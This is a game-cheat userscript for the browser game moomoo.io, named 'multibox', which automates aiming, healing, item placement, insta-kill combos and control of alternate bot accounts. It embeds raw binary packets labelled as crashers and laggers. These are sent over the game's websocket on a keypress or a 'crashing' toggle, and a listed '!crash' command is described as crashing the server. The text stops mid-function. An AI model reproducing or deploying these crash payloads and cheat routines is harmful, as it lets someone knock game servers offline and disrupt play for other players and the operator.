// ==UserScript==
// @name          multibox
// @namespace    -
// @version      4.6.9
// @description  Hush Shhhhhhhhhhhhhh
// @author       Kasumi is kinda gay
// @match        *://moomoo.io/*
// @match        *://dev.moomoo.io/*
// @match        *://sandbox.moomoo.io/*
// @require https://greasyfork.org/scripts/368273-msgpack/code/msgpack.js?version=598723
// ==/UserScript==

document.ktn = false;
bullTicker = false;
document.handleMessage = (e) => {
    console.log(e);
}
document.handleSender = (data) => {
    document.socket.send(data);
}
let crasherFb = new Uint8Array(Object.values({"0":135,"1":102,"2":37,"3":116,"4":94,"5":162,"6":44,"7":210,"8":28,"9":223,"10":1,"11":13,"12":113,"13":180,"14":165,"15":104,"16":171,"17":228,"18":77,"19":178,"20":110,"21":66,"22":74,"23":238,"24":68,"25":208,"26":186,"27":106,"28":180,"29":219,"30":163,"31":225,"32":196,"33":115,"34":79,"35":169,"36":41,"37":6,"38":204,"39":140,"40":152,"41":149,"42":207,"43":59,"44":20,"45":164,"46":120,"47":3,"48":1,"49":93,"50":103,"51":219,"52":19,"53":180,"54":202,"55":51,"56":214,"57":106,"58":255,"59":231,"60":236,"61":39,"62":180,"63":230,"64":120,"65":103,"66":168,"67":197,"68":229,"69":65,"70":237,"71":239,"72":61,"73":216,"74":60,"75":80,"76":224,"77":83,"78":58,"79":207,"80":121,"81":242,"82":13,"83":192,"84":117,"85":14,"86":93,"87":201,"88":81,"89":91,"90":12,"91":20,"92":11,"93":214,"94":182,"95":157,"96":145,"97":26,"98":66,"99":119,"100":182,"101":150,"102":49,"103":135,"104":214,"105":91,"106":173,"107":207,"108":244,"109":8,"110":249,"111":39,"112":86,"113":174,"114":49,"115":205,"116":43,"117":218,"118":35,"119":241,"120":182,"121":114,"122":79,"123":232,"124":180,"125":142,"126":45,"127":121,"128":46,"129":186,"130":161,"131":2,"132":220,"133":85,"134":134,"135":100,"136":94,"137":38,"138":244,"139":223,"140":224,"141":211,"142":168,"143":36,"144":65,"145":85,"146":31,"147":200,"148":150,"149":232,"150":228,"151":150,"152":35,"153":62,"154":134,"155":178,"156":185,"157":203,"158":121,"159":233,"160":251,"161":191,"162":242,"163":16,"164":3,"165":252,"166":232,"167":69,"168":56,"169":128,"170":239,"171":147,"172":113,"173":57,"174":218,"175":14,"176":43,"177":89,"178":232,"179":22,"180":203,"181":8,"182":16,"183":178,"184":120,"185":159,"186":25,"187":78,"188":233,"189":240,"190":215,"191":185,"192":180,"193":117,"194":53,"195":171,"196":99,"197":3,"198":45,"199":54,"200":78,"201":211,"202":173,"203":120,"204":109,"205":146,"206":96,"207":73,"208":255,"209":3,"210":76,"211":216,"212":168,"213":115,"214":121,"215":133,"216":139,"217":230,"218":100,"219":4,"220":244,"221":0,"222":201,"223":62,"224":93,"225":221,"226":60,"227":65,"228":17,"229":145,"230":94,"231":150,"232":244,"233":6,"234":198,"235":118,"236":116,"237":216,"238":208,"239":250,"240":25,"241":208,"242":107,"243":45,"244":140,"245":1,"246":31,"247":42,"248":4,"249":111,"250":158,"251":205,"252":200,"253":182,"254":137,"255":187,"256":5,"257":118,"258":115,"259":1,"260":122,"261":24,"262":161,"263":205,"264":229,"265":51,"266":53,"267":67,"268":237,"269":217,"270":21,"271":64,"272":134,"273":168,"274":147,"275":197,"276":79,"277":4,"278":167,"279":253,"280":228,"281":150,"282":206,"283":4,"284":66,"285":114,"286":140,"287":42,"288":182,"289":115,"290":35,"291":143,"292":25,"293":164,"294":1,"295":6,"296":105,"297":116,"298":118,"299":102,"300":52,"301":127,"302":177,"303":254,"304":93,"305":2,"306":106,"307":200,"308":33,"309":129,"310":23,"311":176,"312":77,"313":230,"314":65,"315":224,"316":138,"317":116,"318":229,"319":205,"320":202,"321":30,"322":59,"323":33,"324":54,"325":57,"326":247,"327":123,"328":33,"329":37,"330":91,"331":59,"332":79,"333":175,"334":24,"335":49,"336":226,"337":125,"338":229,"339":79,"340":224,"341":151,"342":157,"343":36,"344":4,"345":191,"346":219,"347":106,"348":96,"349":150,"350":27,"351":111,"352":209,"353":245,"354":218,"355":81,"356":2,"357":55,"358":31,"359":38,"360":90,"361":44,"362":237,"363":141,"364":24,"365":239,"366":157,"367":192,"368":117,"369":144,"370":19,"371":70,"372":63,"373":169,"374":205,"375":245,"376":189,"377":255,"378":194,"379":105,"380":234,"381":96,"382":109,"383":226,"384":197,"385":74,"386":72,"387":139,"388":145,"389":93,"390":212,"391":229,"392":252,"393":61,"394":8,"395":143,"396":177,"397":22,"398":32,"399":249,"400":126,"401":26,"402":38,"403":244,"404":223,"405":190,"406":210,"407":78,"408":240,"409":137,"410":11,"411":242,"412":224,"413":186,"414":201,"415":80,"416":177,"417":46,"418":84,"419":220,"420":185,"421":69,"422":156,"423":199,"424":132,"425":141,"426":39,"427":64,"428":157,"429":228,"430":211,"431":211,"432":154,"433":68,"434":175,"435":86,"436":139,"437":11,"438":190,"439":244,"440":23,"441":232,"442":88,"443":38,"444":11,"445":116,"446":218,"447":131,"448":40,"449":185,"450":224}))
t = null;
let veryslowLagger = new Uint8Array([151,8,192,103,36,183,235,99,236,91,233,118,103,249,168,199,56,173,146,212,95,55,88,215,114,23,163,37,216,18,153,90,204,58,152,204,128,97,61,232,38,38,207,172,78,33,157,98,168,162,17,222,226,204,16,5,61,180,102,14,184,102,132,152,125,171,208,193,154,115,218,139,150,218,203,116,195,140,171,109,242,166,53,55,124,192,33,70,78,134,149,39,179,178,198,142,134,69,139,153,10,11,143,194,154,176,102,15,206,140,37,66,194,123,241,66,81,17,124,208,148,148,16,202,203,122,129,16,221,0,246,221,198]);
let slowLagger = new Uint8Array([134, 228, 168, 240, 135, 52, 63, 243, 156, 54, 82, 25, 228, 149, 156, 96, 130, 41, 106, 183, 238, 137, 26, 187, 129, 157, 164, 132, 60, 111, 42, 139, 200, 210, 0, 244, 107, 130, 31, 70, 68, 210, 186, 13, 35, 65, 171, 251, 59, 137, 239, 239, 232, 27, 253, 74, 250, 241, 136, 244, 131, 195, 117, 104, 41, 221, 1, 79, 159, 103]);
let highLagger = new Uint8Array([159, 18, 223, 1, 76, 246, 3]);
let crasherF = new Uint8Array([150, 121, 136, 241, 19, 192, 165, 66, 136, 185, 223, 70, 43, 9, 34, 102, 241, 61, 122, 51, 160, 53, 110, 129, 72, 227, 211, 62, 145, 15, 84, 250, 170, 140, 94, 240, 42, 223, 216, 97, 84, 57, 146, 249, 59, 125, 11, 96, 223, 1, 167, 236, 229]);
document.addEventListener("keydown", e => {
    if (document.activeElement.tagName.toLowerCase() !== "input" && document.activeElement.tagName.toLowerCase() !== "textarea" && !document.getElementById('chatHolder').offsetParent) {
        if (e.keyCode == 66) {
            document.ws.oldSend(crasherFb);
        }
    }
})
let generateName = () => {
    return "AyE";
};
let playerName = generateName;
let botsName = generateName;
let createRandomClan = () => {
    let gen = "";
    for (let i = 0; i < 5; i++) gen += Math.round(Math.random() * 999999);
    let n = `RDPRO`;
    let p = n.substring(0, 7);
    return p;
};
let oldClan = "";

let commands = {"!f": "for auto follower", "!!f": "for disable auto follower", "!crash": "for crashing the server", "!ff": "for player follower global", "!!ff": "for disable player follower global", "!ffs": "for mouse follower", "!!ffs": "for disable mouse follower", "!join ${party name}": "for joining a party name", "!leave": "for leaving a party", "!close": "for closing sockets", "!wood": "players go to trees to collect wood", "!food": "players go to collect food", "!stone": "players go to collect stones", "~wood": "send wood info", "~stone": "send stone info", "~gold": "send gold info", "~food": "send food info"};
let keys = {q: "Toggle for healing, Enable/Disable", f: "place traps every 100 milliseconds", v: "place spikes", n: "place 2 mills every 100 milliseconds", r: "for auto insta", h: "for disable auto insta", "u or space": "for musket insta", z: "for tank gear", g: "for soldier", y: "for bull helmet", i: "switch for 4 traps or 1 trap, enable disable", o: "for select polearm and hammer", p: "for point a position bots moving to, enable/disable", j: "for samurai", k: "toggle for emp/soldier", l: "for katana musket || polearm musket", "[": "toggle for control/uncontrol alts", t: "toggle for healing", c: "toggle for auto hat", ctrl: "bots aiming on mouse, enable/disable."};
let fnc = [];
let fnv = [];
let weapons;
let mats;
let instaSpeed = 200;
let healToggle = true;
let hatToggle = false;
let empToggle = false;
let accLimit = 3;
let accept = 0;
let ws;
let cvs;
let width;
let height;
let mouseX;
let mouseY;
let dir;

let primary;
let secondary;
foodType = null;
let wallType;
let spikeType;
let millType;
let mineType;
let boostType;
let turretType;
let spawnpadType;
let healer;
let spiker;
let trapper;
let trapper4;
let miller;
let crashing;
let playerFollowerGlobal = true;
let ffs;
let ffsps;
sockets = {};
myPlayer = {};
let pointingOnPosition = {};
let trees = [];
let stones = [];
let foods = [];
let mines = [];
let nearestTree;
let nearestStone;
let nearestFood;
let nearestMine;
let nearestTreeAngle;
let nearestStoneAngle;
let nearestFoodAngle;
let nearestMineAngle;
let closed;
let typeMovement = null;
let pointer = true;
enemiesNear = null;
isEnemyNear = null;
nearestEnemy = null;
nearestEnemyAngle = null;
let autoaim = false;
let autoaim2 = false;
let aimOnMouse = true;
let autoAttackWithAim3 = false;
let autoAttackWithAim = false;
let autoInsta;
let JustDied;
let normalHat;
let normalAcc;
let oldHat;
let oldAcc;

let wooding;
let stoning;
let fooding;
let mining;

let autoAttack;
let freeze;
fncc = (data) => {

}
let msgpack5 = msgpack;
document.msgpack = msgpack;
document.myPlayer = myPlayer;

function dist(a, b){ return Math.sqrt( Math.pow((b.y-a[2]), 2) + Math.pow((b.x-a[1]), 2) ); };
function acc(id) { doNewSend(["13c", [1, id, 1]]); doNewSend(["13c", [0, 0, 1]]); doNewSend(["13c", [0, id, 1]]); };
function hat(id) { doNewSend(["13c", [1, id, 0]]); doNewSend(["13c", [0, id, 0]]); };
function toRad(angle) { return angle * (Math.PI / 180); };
let doNewSend = (e) => { if (!closed) ws.oldSend(new Uint8Array(Array.from(msgpack5.encode(e)))); };
document.doNewSend = doNewSend;

document.poisonq = false;
function poison() {
    if (!document.poisonq) {
        document.poisonq = true;
        let instaSpeed = document.instaSpeed;
        document.instaSpeed = 130;
        doNewSend(["13c", [1, 21, 0]])
        doNewSend(['33', [nearestEnemyAngle]])
        setTimeout(() => {
            document.doNewSend(['33', []])
            document.instaSpeed = instaSpeed;
            instaSpeed = null;
            doNewSend(['13c', [0, 11, 1]])
            document.poisonq = false;
        }, 300)
        autoaim = true;
        autoAttackWithAim3 = true;
        doNewSend(["5", [primary, 1]]);
        doNewSend(["13c", [0, 0, 1]])
        doNewSend(["13c", [0, 19, 1]])
        doNewSend(["13c", [0, 21, 0]])
        doNewSend(["2", [nearestEnemyAngle]]);
        setTimeout(() => {
            autoaim = false;
            autoAttackWithAim3 = false;
            if (!empToggle) {
                doNewSend(["13c", [1, 6, 0]]);
                doNewSend(["13c", [0, 6, 0]]);
            }
            if (empToggle) {
                doNewSend(["13c", [1, 22, 0]]);
                doNewSend(["13c", [0, 22, 0]]);
            }
            doNewSend(['c', [0]]);
        }, 300);
    }
}
let handleMessage = function(e) {
    let temp = msgpack5.decode(new Uint8Array(e.data));
    let data = null;
    if(temp.length > 1) {
        data = [temp[0], ...temp[1]];
        if (data[1] instanceof Array){
            data = data;
        }
    } else {
        data = temp;
    }
    let item = data[0];
    if(!data) {return};
    fncc(data);

    if (item == "io-init") {
        cvs = document.getElementById("gameCanvas");
        setTimeout(() => { if (document.getElementById("mainMenu")) { document.getElementById("mainMenu").remove(); } }, 5000);
        width = cvs.clientWidth;
        height = cvs.clientHeight;
        $(window).resize(function() {
            width = cvs.clientWidth;
            height = cvs.clientHeight;
        });
        let place = (e, t = dir) => {
            doNewSend(['5', [e, null]]);
            doNewSend(['c', [1, (Math.PI*9999999998) + t]]);
            doNewSend(['c', [0, (Math.PI*9999999998) + t]]);
            doNewSend(['5', [null]]);
        }
        document.place = place;
        let placeNormal = (e, t = dir) => {
            doNewSend(['5', [e, null]]);
            doNewSend(['c', [1, t]]);
            doNewSend(['c', [0, t]]);
            doNewSend(['5', [null]]);
        }
        let placeForAll = (e, t = dir) => {
            sendForAll(['5', [e, null]]);
            sendForAll(['c', [1, (Math.PI*9999999998) + t]]);
            sendForAll(['c', [0, (Math.PI*9999999998) + t]]);
            sendForAll(['5', [null]]);
        }
        cvs.addEventListener('mousemove', e => {
            mouseX = e.clientX;
            mouseY = e.clientY;
            dir = Math.atan2(event.clientY - height / 2, event.clientX - width / 2);
            if (!autoaim) {
                doNewSend(['2', [(Math.PI*9999999998) + dir]]);
            }
        })
        cvs.addEventListener('mousedown', e => {
            if (e.button == 0) {
                doNewSend(['c', [1]]);
            }
            if (e.button == 1) {
                autoaim = true;
                doNewSend(['c', [1]]);
            }
            if (e.button == 2) {
                poison();
                doNewSend(['c', [1]]);
            }
        })
        cvs.addEventListener('mouseup', e => {
            if (e.button == 0) {
                doNewSend(['c', [0]]);
            }
            if (e.button == 1) {
                autoaim = false;
                doNewSend(['c', [0]]);
            }
            if (e.button == 2) {
                doNewSend(['c', [0]]);
            }
        })
        document.key22 = 1;
        document.addEventListener('keydown', e => {
            if (document.key22 !== e.keyCode) {
                document.key22 = e.keyCode;
                if (document.activeElement.tagName.toLowerCase() !== "input" && document.activeElement.tagName.toLowerCase() !== "textarea" && !document.getElementById('chatHolder').offsetParent) {
                    if (e.keyCode == 81) {
                        healer = !healer;
                    }
                    if (e.keyCode == 86) {
                        spiker = true;
                    }
                    if (e.keyCode == 70) {
                        trapper = true;
                    }
                    if (e.keyCode == 78) {
                        miller = true;
                    }
                    if (e.keyCode == 84 && !document.ktn) {
                        healToggle = !healToggle;
                    }
                    if (e.keyCode == 67 && !document.ktn) {
                        hatToggle = !hatToggle;
                    }
                    if (e.keyCode == 75) {
                        empToggle = !empToggle;
                    }
                    if (e.keyCode == 80) {
                        pointer = !pointer;
                    }
                    if (e.keyCode == 35) {
                        crashing = !crashing;
                    }
                    if (e.keyCode == 46) {
                        doNewSend(["5", ["constructor", true]]);
                    }
                    if (e.keyCode == 219) {
                        if (!autoAttack) {
                            for (let i in sockets) {
                                sockets[i].controlled = true;
                            }
                        }
                    }
                    if (e.keyCode == 221) {
                        if (!autoAttack) {
                            for (let i in sockets) {
                                sockets[i].controlled = false;
                            }
                        }
                    }
                    if ((e.keyCode == 85) && !document.ktn) {
                        autoaim = true;
                        let myPlayerOldHat = myPlayer.hat;
                        doNewSend(["13c", [1, 6, 0]]);
                        doNewSend(["13c", [1, 7, 0]]);
                        doNewSend(["13c", [1, 53, 0]]);
                        autoAttackWithAim3 = true;
                        doNewSend(['c', [1]])
                        doNewSend(["6", [5]]);
                        doNewSend(["6", [17]]);
                        doNewSend(["6", [31]]);
                        doNewSend(["6", [23]]);
                        doNewSend(["6", [9]]);
                        doNewSend(["6", [18]]);
                        doNewSend(['5', [9, true]]);
                        doNewSend(["13c", [0, 53, 0]]);
                        setTimeout(() => {
                            if (primary !== 8) {
                                doNewSend(['6', [12]]);
                            }
                        }, 145);
                        setTimeout(() => {
                            if (primary !== 8) {
                                doNewSend(['6', [15]])
                            }
                            doNewSend(['5', [15, true]]);
                            doNewSend(['5', [secondary, true]]);
                            setTimeout(() => {
                                autoaim = false;
                                autoAttackWithAim3 = false;
                                doNewSend(['5', [primary, true]])
                                doNewSend(['c', [0]])
                                doNewSend(["2", [dir]]);
                                if (!empToggle) {
                                    doNewSend(["13c", [1, 6, 0]]);
                                    doNewSend(["13c", [0, myPlayerOldHat, 0]]);
                                }
                                if (empToggle) {
                                    doNewSend(["13c", [1, 22, 0]]);
                                    doNewSend(["13c", [0, 22, 0]]);
                                }
                            }, 300);
                        }, 200);
                    }
                    if (document.ktn) {
                        if (e.keyCode == 32) {
                            autoaim = true;
                            doNewSend(["5", [primary, true]]);
                            doNewSend(["13c", [0, 7, 0]]);
                            doNewSend(["13c", [0, 0, 1]]);
                            doNewSend(["13c", [0, 18, 1]]);
                            place(spikeType);
                            doNewSend(["c", [1]]);

                            setTimeout( () => {
                                doNewSend(["13c", [0, 53, 0]]);
                            }, 80);

                            setTimeout( () => {
                                doNewSend(["c", [0, null]]);
                                doNewSend(["13c", [0, 6, 0]]);
                                autoaim = false;
                            }, 180);
                        }
                        if (e.keyCode == 71 && document.activeElement.id.toLowerCase() !== 'chatbox') {
                            hat(6)
                        }
                        if (e.keyCode == 90 && document.activeElement.id.toLowerCase() !== 'chatbox') {
                            hat(40)
                        }
                        if (e.keyCode == 84 && document.activeElement.id.toLowerCase() !== 'chatbox') {
                            hat(53)
                        }
                        if (e.keyCode == 89 && document.activeElement.id.toLowerCase() !== 'chatbox') {
                            hat(7)
                        }
                        if (e.keyCode == 72 && document.activeElement.id.toLowerCase() !== 'chatbox') {
                            hat(11)
                        }
                        if (e.keyCode == 85 && document.activeElement.id.toLowerCase() !== 'chatbox') {
                            hat(21)
                        }
                        if (e.keyCode == 67 && document.activeElement.id.toLowerCase() !== 'chatbox') {
                            hat(26)
                        }
                        if (e.keyCode == 74 && document.activeElement.id.toLowerCase() !== 'chatbox') {
                            hat(20)
                        }
                        if (e.keyCode == 66 && document.activeElement.id.toLowerCase() !== 'chatbox') {
                            hat(12)
                        }
                        if (e.keyCode == 192 && document.activeElement.id.toLowerCase() !== 'chatbox') {
                            acc(21)
                        }
                    }
                    if (e.keyCode == 73) {
                        trapper4 = !trapper4;
                    }
                    if (e.keyCode == 186) {
                        for (let i=0;i<4;i++) {
                            let angle = toRad(i * 90);
                            place(spikeType, angle);
                        }
                    }
                    if (e.keyCode == 77) {
                        if (myPlayer.y < 2400) {
                            doNewSend(["13c", [1, 15, 0]]);
                            doNewSend(["13c", [0, 15, 0]]);
                        } else if (myPlayer.y > 6850 && myPlayer.y < 7550) {
                            doNewSend(["13c", [1, 31, 0]]);
                            doNewSend(["13c", [0, 31, 0]]);
                        } else {
                            doNewSend(["13c", [1, 12, 0]]);
                            doNewSend(["13c", [0, 12, 0]]);
                        }
                        doNewSend(["13c", [1, 11, 1]]);
                        doNewSend(["13c", [0, 11, 1]]);
                    }
                    if (e.keyCode == 118) {
                        sendForAll(["6", [8]]);
                        sendForAll(["6", [17]]);
                        sendForAll(["6", [31]]);
                        sendForAll(["6", [23]]);
                        sendForAll(["6", [10]]);
                        sendForAll(["6", [38]]);
                    }
                    if(e.keyCode == 119) {
                        sendForAll(["6", [4]]);
                        sendForAll(["6", [15]]);
                    }
                    if(e.keyCode == 16) {
                        sendForAll(["13c", [0, 0, 1]]);
                    }
                    if (e.keyCode == 79) {
                        doNewSend(["6", [5]]);
                        doNewSend(["6", [17]]);
                        doNewSend(["6", [31]]);
                        doNewSend(["6", [23]]);
                        doNewSend(["6", [10]]);
                        doNewSend(["6", [38]]);
                        if (primary !== 8) {
                            doNewSend(["6", [36]]);
                        }
                    }
                    if (e.keyCode == 76) {
                        sendForAll(["6", [4]]);
                        sendForAll(["6", [15]]);
                    }
                    if (!document.ktn) {
                        if (e.keyCode == 90) {
                            sendForAll(["13c", [1, 40, 0]]);
                            sendForAll(["13c", [0, 40, 0]]);
                        }
                        if (e.keyCode == 71) {
                            if (!empToggle) {
                                sendForAll(["13c", [1, 6, 0]]);
                                sendForAll(["13c", [0, 6, 0]]);
                            }
                            if (empToggle) {
                                sendForAll(["13c", [1, 22, 0]]);
                                sendForAll(["13c", [0, 22, 0]]);
                            }
                        }
                        if (e.keyCode == 89) {
                            sendForAll(["13c", [1, 7, 0]]);
                            sendForAll(["13c", [0, 7, 0]]);
                        }
                        if (e.keyCode == 74) {
                            sendForAll(["13c", [1, 20, 0]]);
                            sendForAll(["13c", [0, 20, 0]]);
                        }
                    }
                    if (e.keyCode == 192 && !document.ktn) {
                        sendForAll(["5", ["length", 1]])
                    }
                    if (e.keyCode == 82) {
                        doNewSend(["13c", [1, 6, 0]]);
                        doNewSend(["13c", [1, 7, 0]]);
                        doNewSend(["13c", [1, 53, 0]]);
                        autoInsta = true;
                    }
                    if (e.keyCode == 72) {
                        autoInsta = false;
                    }
                    if (e.keyCode == 190) {
                        sendForAll(["6", [36]]);
                    }
                    if (e.keyCode == 191) {
                        sendForAll(["6", [4]]);
                        sendForAll(["6", [25]]);
                    }
                }
            }
        })
        document.addEventListener('keyup', e => {
            document.key22 = null;
            if (e.keyCode == 81) {
                doNewSend(['c', [0]]);
                doNewSend(['5', [null]]);
            }
            if (e.keyCode == 86) {
                spiker = false;
            }
            if (e.keyCode == 70) {
                trapper = false;
            }
            if (e.keyCode == 78) {
                miller = false;
            }
        })
        let lagger = 0;
        let anotherLagger = 0;
        setInterval(() => {
            if (autoaim) {
                doNewSend(['2', [(Math.PI*9999999998) + nearestEnemyAngle]]);
            }
            if (autoaim2) {
                for (let i = 0; i < 75; i++) {
                    doNewSend(['2', [nearestEnemyAngle]]);
                }
            }
            if (autoAttackWithAim) {
                for (let i = 0; i < 75; i++) {
                    doNewSend(['c', [1, (Math.PI*9999999998) + nearestEnemyAngle]]);
                }
            }
            if (crashing && !closed) {
                lagger++;
                if (lagger < 50) {
                    document.ws.oldSend(highLagger);
                    document.ws.oldSend(slowLagger);
                }
            }
            if (healer) {
                placeNormal(foodType, null);
            }
            if (spiker) {
                place(spikeType);place(spikeType);place(spikeType);place(spikeType);place(spikeType);
            }
            if (autoAttackWithAim3) {
                doNewSend(['c', [1]]);doNewSend(['c', [1]]);doNewSend(['c', [1]]);
            }
            if (trapper) {
                if (!trapper4) {
                    place(boostType);place(boostType);place(boostType);place(boostType);place(boostType);
                }
            }
        })
        setInterval(() => {
            if (miller) {
                for (let i = 0; i < 3; i++) {
                    place(millType, dir + toRad((i - 1) * 65.3987));
                }
            }
            if (trapper) {
                if (trapper4) {
                    for (let i = 0; i < 4; i++) {
                        place(boostType, dir + toRad(i * 90));
                    }
                }
            }
        }, 100);
        weapons = [0];
        mats = [0, 3, 6, 10];
        primary = 0;
        secondary = null;
        foodType = 0;
        wallType = 3;
        spikeType = 6;
        millType = 10;
        boostType = null;
        mineType = null;
        turretType = null;
        spawnpadType = null;
        doNewSend(['sp', [{name: playerName(), moofoll: "1", skin: 4}]]);
        /*
        let coreURL = new URL(window.location.href);
        let server = coreURL.searchParams.get("server");
        let sip = "";
        for (let gameServer of vultr.servers) {
            if (`${gameServer.region.split(":")[1]}:${gameServer.index}:0` == server) {
                sip = gameServer.ip;
            }
        }
        myPlayer.server = `wss://ip_${sip}.moomoo.io:8008/?gameIndex=0`;
        for (let i2 = 0; i2 < 3; i2++) {
            grecaptcha.execute("6LevKusUAAAAAAFknhlV8sPtXAk5Z5dGP5T2FYIZ", { action: "homepage" }).then((function(e) {
                wsType(`${myPlayer.server}&token=${encodeURIComponent(e)}`);
            }));

        }
        */
        myPlayer.server = ws.url.split("&")[0];
        /*for (let i2 = 0; i2 < 3; i2++) {
            grecaptcha.execute("6LevKusUAAAAAAFknhlV8sPtXAk5Z5dGP5T2FYIZ", { action: "homepage" }).then((function(e) {
                wsType(`${myPlayer.server}&token=${encodeURIComponent(e)}`);
            }));
        }*/
    }
    if (item == "1" && !myPlayer.id) {
        doNewSend(['13c', [0, 36, 0]]);
        myPlayer.id = data[1];
        myPlayer.wood = 100;
        myPlayer.stone = 100;
        myPlayer.food = 100;
        myPlayer.points = 100;
        myPlayer.goldPerSecond = 0;
        myPlayer.kills = 0;
    }
    if (item == "11") {
        weapons = [0];
        mats = [0, 3, 6, 10];
        primary = 0;
        secondary = null;
        foodType = 0;
        wallType = 3;
        spikeType = 6;
        millType = 10;
        boostType = null;
        mineType = null;
        turretType = null;
        spawnpadType = null;
        myPlayer.wood = 100;
        myPlayer.stone = 100;
        myPlayer.food = 100;
        myPlayer.points = 100;
        myPlayer.goldPerSecond = 0;
        myPlayer.oldPoints = 0;
        myPlayer.newPoints = 0;
        myPlayer.kills = 0;
        fnc = [];
        if (!autoAttack && !freeze) {
            doNewSend(['sp', [{name: playerName(), moofoll: "1", skin: 4}]]);
        } else {
            JustDied = true;
        }
    }
    if (JustDied) {
        if (!autoAttack && !freeze) {
            JustDied = false;
            doNewSend(['sp', [{name: playerName(), moofoll: "1", skin: 4}]]);
        }
    }
    if (item == "2") {
        if (data[1][2] == myPlayer.id) {
            myPlayer.x = data[1][3];
            myPlayer.y = data[1][4];
            myPlayer.dir = data[1][5];
            if (data[1][7] < 90 && data[1][7] > 0) {
                if (healToggle) {
                    doNewSend(['5', [foodType, null]]);
                    doNewSend(['c', [1]]);
                    doNewSend(['c', [0]]);
                    doNewSend(['5', [null]]);
                }
            }
        }
    }
    if (item == "33") {
        t = Date.now();
        enemiesNear = [];
        for(let i = 0; i < data[1].length / 13; i++) {
            let playerInfo = data[1].slice(13*i, 13*i+13);
            if(playerInfo[0] == myPlayer.id) {
                myPlayer.x = playerInfo[1];
                myPlayer.y = playerInfo[2];
                myPlayer.dir = playerInfo[3];
                myPlayer.object = playerInfo[4];
                myPlayer.weapon = playerInfo[5];
                myPlayer.clan = playerInfo[7];
                myPlayer.isLeader = playerInfo[8];
                myPlayer.hat = playerInfo[9];
                myPlayer.accessory = playerInfo[10];
                myPlayer.isSkull = playerInfo[11];
            } else if(playerInfo[7] !== myPlayer.clan || playerInfo[7] === null) {
                delete playerInfo[4];
                delete playerInfo[6];
                delete playerInfo[11];
                delete playerInfo[12];
                delete playerInfo[13];
                enemiesNear.push(playerInfo);
            }
        }
    }
    if (item == "id") {
        doNewSend(['8', [createRandomClan()]]);
    }
    if (item == "an") {
        if (data[2] == generateName()) {
            accept++;
            if (accept <= 100) {
                setTimeout(() => {
                    doNewSend(['11', [data[1], 1]]);
                }, accept * 850);
            }
        }
    }
    if (item == "ac") {
        if (data[1].owner == myPlayer.id) {
            oldClan = data[1].sid;
        }
    }
    if (item == "ad") {
        if (data[1] == oldClan) {
            oldClan = null;
            accept = 0;
        }
    }
    if (item == "9") {
        if (data[1] == "wood") {
            myPlayer.wood = data[2];
        }
        if (data[1] == "stone") {
            myPlayer.stone = data[2];
        }
        if (data[1] == "food") {
            myPlayer.food = data[2];
        }
        if (data[1] == "points") {
            myPlayer.newPoints = data[2];
            myPlayer.goldPerSecond = myPlayer.newPoints - myPlayer.oldPoints;
            myPlayer.oldPoints = data[2];
            myPlayer.points = data[2];
        }
        if (data[1] == "kills") {
            myPlayer.kills = data[2];
        }
    }
    if (item == "6") {
        for(let i = 0; i < data[1].length / 8; i++) {
            let info = data[1].slice(8*i, 8*i+8);
            if (info[5] == 0) {
                trees.push(info);
            }
            if (info[5] == 1) {
                foods.push(info);
            }
            if (info[5] == 2) {
                stones.push(info);
            }
            if (info[5] == 3) {
                mines.push(info);
            }
        }
    }
    if (trees) {
        nearestTree = trees.sort((a,b) => dist(a, myPlayer) - dist(b, myPlayer))[0];
        if (nearestTree) {
            nearestTreeAngle = Math.atan2(nearestTree[2]-myPlayer.y, nearestTree[1]-myPlayer.x);
        }
    }
    if (foods) {
        nearestFood = foods.sort((a,b) => dist(a, myPlayer) - dist(b, myPlayer))[0];
        if (nearestFood) {
            nearestFoodAngle = Math.atan2(nearestFood[2]-myPlayer.y, nearestFood[1]-myPlayer.x);
        }
    }
    if (stones) {
        nearestStone = stones.sort((a,b) => dist(a, myPlayer) - dist(b, myPlayer))[0];
        if (nearestStone) {
            nearestStoneAngle = Math.atan2(nearestStone[2]-myPlayer.y, nearestStone[1]-myPlayer.x);
        }
    }
    if (mines) {
        nearestMine = mines.sort((a,b) => dist(a, myPlayer) - dist(b, myPlayer))[0];
        if (nearestMine) {
            nearestMineAngle = Math.atan2(nearestMine[2]-myPlayer.y, nearestMine[1]-myPlayer.x);
        }
    }
    isEnemyNear = false;
    if(enemiesNear) {
        nearestEnemy = enemiesNear.sort((a,b) => dist(a, myPlayer) - dist(b, myPlayer))[0];
    }
    if(nearestEnemy) {
        nearestEnemyAngle = Math.atan2(nearestEnemy[2]-myPlayer.y, nearestEnemy[1]-myPlayer.x);
        if(Math.sqrt(Math.pow((myPlayer.y-nearestEnemy[2]), 2) + Math.pow((myPlayer.x-nearestEnemy[1]), 2)) < 300) {
            isEnemyNear = true;
            if(autoaim == false && myPlayer.hat != 7 && myPlayer.hat != 53) {
                normalHat = 6;
                if(primary != 8) {
                    normalAcc = 19;
                }
            };
        }
    }
    if(!isEnemyNear && !autoaim) {
        normalAcc = 11;
        if (myPlayer.y < 2400) {
            normalHat = 15;
        } else if (myPlayer.y > 6850 && myPlayer.y < 7550) {
            normalHat = 31;
        } else {
            normalHat = 12;
        }
    }
    if(hatToggle) {
        if(oldHat != normalHat) {
            oldHat = normalHat;
            hat(normalHat);
        }
        if(oldAcc != normalAcc) {
            oldAcc = normalAcc;
            acc(normalAcc);
        }
    }
    if (nearestEnemy && autoInsta) {
        if (Math.sqrt(Math.pow((myPlayer.y-nearestEnemy[2]), 2) + Math.pow((myPlayer.x-nearestEnemy[1]), 2)) < 215) {
            autoInsta = false;
            autoaim = true;
            autoAttackWithAim3 = true;
            setTimeout(() => {
                doNewSend(['13c', [0, 11, 1]]);
                doNewSend(['13c', [1, 19, 1]]);
                doNewSend(['13c', [0, 19, 1]]);
            }, 300)
            if (myPlayer.weapon == 0) {
                doNewSend(["6", [5]]);
                doNewSend(["6", [17]]);
                doNewSend(["6", [31]]);
                doNewSend(["6", [23]]);
                doNewSend(["6", [10]]);
                doNewSend(["6", [18]]);
                doNewSend(["6", [36]]);
            }
            doNewSend(["6", [15]]);
            doNewSend(['13c', [0, 0, 1]])
            doNewSend(['13c', [0, 19, 1]])
            doNewSend(['13c', [0, 7, 0]])
            doNewSend(["5", [primary, 1]]);
            ws.oldSend(slowLagger);
            doNewSend(['c', [1, nearestEnemyAngle]]);
            setTimeout(() => {
                doNewSend(['13c', [0, 53, 0]]);
                doNewSend(["5", [15, 1]]);
                doNewSend(["5", [secondary, 1]]);
                setTimeout(() => {
                    autoaim = false;
                    autoAttackWithAim3 = false;
                    doNewSend(["5", [primary, 1]]);
                    if (!empToggle) {
